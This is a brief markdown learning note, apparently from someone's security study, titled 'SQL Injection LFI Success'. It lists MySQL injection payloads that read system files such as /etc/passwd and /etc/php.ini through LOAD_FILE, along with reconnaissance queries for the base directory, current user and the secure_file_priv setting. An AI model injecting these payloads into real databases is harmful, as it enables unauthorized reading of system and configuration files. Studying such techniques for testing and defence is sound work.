---
title: SQL Injection LFI Success
description: SQL Injection LFI Success
last_update:
  date: "2025-08-23T08:00:00+08:00"
---

## 學到的東西

```sql
LOAD_FILE('/etc/passwd')
LOAD_FILE('/etc/php.ini')
@@basedir
CURRENT_USER()
SELECT variable_value FROM information_schema.global_variables WHERE variable_name = 'secure_file_priv'
```
